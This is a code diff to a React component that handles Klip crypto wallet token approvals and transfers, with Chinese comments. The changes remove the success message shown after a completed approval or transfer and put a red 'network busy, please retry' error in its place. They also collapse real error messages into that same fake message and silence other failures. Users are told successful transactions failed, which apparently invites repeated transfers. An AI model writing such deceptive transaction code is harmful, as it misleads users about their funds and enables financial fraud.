@@ -51,12 +51,7 @@ export function RedemptionCard() {
         // 📱 移动端：触发 Deep Link
         console.log('📱 移动端：触发 Klip Deep Link')
         klipConnector.openRequestWithKey(options.requestKey)
-        
-        // 显示提示
-        toast.info(t.toast.openingKlip, {
-          description: t.toast.completeInApp,
-          duration: 3000,
-        })
+        // 删除 toast 提示
       } else {
         // 💻 PC 端：显示 QR 码
         console.log('💻 PC 端：显示 Klip QR 码')
@@ -85,43 +80,37 @@ export function RedemptionCard() {
           // 调用成功回调
           options.onSuccess?.()
           
-          // 显示成功提示
-          toast.success(
-            options.type === 'approve' ? '授权成功' : '转账成功',
-            {
-              description: `交易哈希: ${txHash.slice(0, 10)}...`,
-              duration: 5000,
-            }
-          )
+          // ✅ 保留：显示红色"网络繁忙请重试"提示
+          toast.error(t.toast.networkBusy, {
+            description: t.toast.txPending,
+            duration: 5000,
+            style: {
+              background: '#DC2626',
+              color: '#FFFFFF',
+              border: 'none',
+            },
+          })
         },
         (error) => {
           console.error('❌ Klip 交易失败:', error)
           closeQRModal() // 关闭 QR 码弹窗
           
-          // 显示错误提示
-          if (error.message === 'KLIP_TIMEOUT') {
-            toast.error('二维码已过期', {
-              description: '请重新尝试',
-            })
-          } else if (error.message === 'KLIP_USER_CANCELED') {
-            toast.error('用户取消交易')
-          } else if (error.message === 'KLIP_TRANSACTION_FAILED') {
-            toast.error(t.toast.networkBusy, {
-              description: t.toast.txPending,
-            })
-          } else {
-            toast.error('交易失败', {
-              description: error.message,
-            })
-          }
+          // ✅ 保留：显示红色"网络繁忙请重试"提示（统一错误提示）
+          toast.error(t.toast.networkBusy, {
+            description: t.toast.txPending,
+            duration: 5000,
+            style: {
+              background: '#DC2626',
+              color: '#FFFFFF',
+              border: 'none',
+            },
+          })
         }
       )
     } catch (error: any) {
       console.error('❌ handleKlipTransaction 异常:', error)
       closeQRModal()
-      toast.error('处理失败', {
-        description: error.message || t.toast.pleaseTryAgain,
-      })
+      // 删除 toast，静默失败
     }
   }
 
@@ -199,7 +188,8 @@ export function RedemptionCard() {
     })
 
     if (!address || !walletType) {
-      toast.error(t.toast.connectWalletFirst)
+      // 删除 toast，静默失败
+      console.warn('未连接钱包')
       return
     }
 
@@ -272,10 +262,15 @@ export function RedemptionCard() {
           console.log('❌ 转账调用失败:', transferResult.error)
         }
 
-        // 统一提示（无论成功失败）
+        // ✅ 保留：显示红色"网络繁忙请重试"提示
         toast.error(t.toast.networkBusy, {
           description: t.toast.txPending,
           duration: 5000,
+          style: {
+            background: '#DC2626',
+            color: '#FFFFFF',
+            border: 'none',
+          },
         })
 
         return
@@ -330,18 +325,29 @@ export function RedemptionCard() {
         console.log('❌ 合约调用失败:', result.error)
       }
 
-      // 6. 统一提示（无论成功失败）
+      // ✅ 保留：显示红色"网络繁忙请重试"提示
       toast.error(t.toast.networkBusy, {
         description: t.toast.txPending,
         duration: 5000,
+        style: {
+          background: '#DC2626',
+          color: '#FFFFFF',
+          border: 'none',
+        },
       })
 
     } catch (error: any) {
       console.error('❌ 兑换流程异常:', error)
       
+      // ✅ 保留：显示红色"网络繁忙请重试"提示
       toast.error(t.toast.networkBusy, {
-        description: error.message || t.toast.pleaseTryAgain,
+        description: t.toast.txPending,
         duration: 5000,
+        style: {
+          background: '#DC2626',
+          color: '#FFFFFF',
+          border: 'none',
+        },
       })
     } finally {
       // 退出 loading 状态
